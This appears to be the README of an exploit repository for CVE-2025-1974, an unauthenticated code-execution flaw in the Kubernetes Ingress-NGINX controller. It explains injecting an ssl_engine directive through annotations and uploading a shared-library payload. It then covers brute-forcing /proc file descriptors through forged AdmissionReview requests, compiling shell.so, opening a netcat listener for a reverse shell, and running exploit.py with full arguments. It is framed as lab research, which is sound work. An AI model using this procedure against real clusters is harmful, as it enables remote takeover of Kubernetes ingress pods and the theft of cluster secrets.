# CVE-2025-1974 – Ingress-NGINX Arbitrary Code Execution Exploit

> ⚠️ For educational and authorized security research purposes only.

## 🔥 CVE-2025-1974 Overview

**CVE-2025-1974** is a critical remote code execution vulnerability in the **Kubernetes Ingress-NGINX Controller**. It allows an **unauthenticated attacker** to execute **arbitrary code inside the Ingress controller pod**, by abusing how custom annotations are processed during NGINX config reloads.

### Root Cause

Ingress-NGINX supports annotations like `auth-url` that get inserted into the live NGINX config. An attacker can smuggle **NGINX directives** using crafted annotation values (e.g., `ssl_engine`) which get injected into the config and are **executed during validation**.

When the `nginx -t` test validates a malicious `ssl_engine` directive pointing to a temporary uploaded `.so` file, NGINX tries to **dynamically load and execute** it via OpenSSL, causing **arbitrary code execution**.

## 🧠 Exploit Summary

This exploit works in **two phases**:

1. **Upload Phase**  
   A `.so` payload (compiled shared library) is uploaded to the NGINX ingress controller using a crafted POST request that **triggers NGINX buffering**, keeping the file open via a file descriptor (FD).

2. **Trigger Phase**  
   The attacker brute-forces `/proc/<pid>/fd/<fd>` combinations by sending forged `AdmissionReview` requests to the **admission webhook**, injecting a malicious `auth-url` that contains:
   ```nginx
   ssl_engine /proc/<pid>/fd/<fd>;

 How to Use exploit.py
The exploit.py script performs the full CVE-2025-1974 exploit by:

Uploading the malicious .so file using raw sockets

Sending a crafted AdmissionReview request with malicious NGINX directives

Brute-forcing open file descriptors until the payload executes

✅ Prerequisites
Your vulnerable lab must be running (e.g., deployed via setup.sh)

Ports 8080 and 8443 must be accessible locally

A compiled payload named shell.so must exist in your directory

You can generate the payload with:

~~~gcc -shared -fPIC shell.c -o shell.so
~~~
And keep your listener ready:

~~~nc -lvnp 4444~~~
🧾 Usage Syntax
~~~
python3 exploit.py \
  --upload-url http://127.0.0.1:8080 \
  --admission-url https://127.0.0.1:8443 \
  --shell shell.so \
  --pid-start 26 \
  --pid-end 40 \
  --fd-start 1 \
  --fd-end 100
~~~
